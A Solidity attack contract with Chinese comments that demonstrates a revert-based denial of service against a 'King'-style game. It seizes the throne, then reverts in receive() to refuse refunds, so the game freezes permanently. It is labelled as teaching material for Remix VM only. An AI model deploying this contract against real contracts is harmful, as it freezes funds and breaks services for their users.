// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * ⚠️ 仅供学习、请勿用于攻击真实合约。仅在 Remix VM 演示。
 *
 * revert 型 DoS 的攻击合约：成为 King 后【拒绝收款】，
 * 让后续任何人都无法把它顶下去，游戏永久卡死。
 */

interface IVulnerableKing {
    // 通过给合约转账触发 receive() 来夺取王位
}

contract KingDoSAttacker {
    address public immutable kingGame;

    constructor(address kingGameAddr) {
        kingGame = kingGameAddr;
    }

    /// 出比当前 prize 更高的价，成为 King
    function seizeThrone() external payable {
        (bool ok, ) = kingGame.call{value: msg.value}("");
        require(ok, "seize failed");
    }

    /**
     * ❌ 核心：拒绝接收任何退款。
     * 当有新玩家想顶替本合约时，VulnerableKing 会尝试把 prize 退给本合约，
     * 这里直接 revert，使那笔交易整体失败 —— 于是没人能成为新王。
     */
    receive() external payable {
        revert("I refuse any refund. Throne is mine forever.");
    }
}
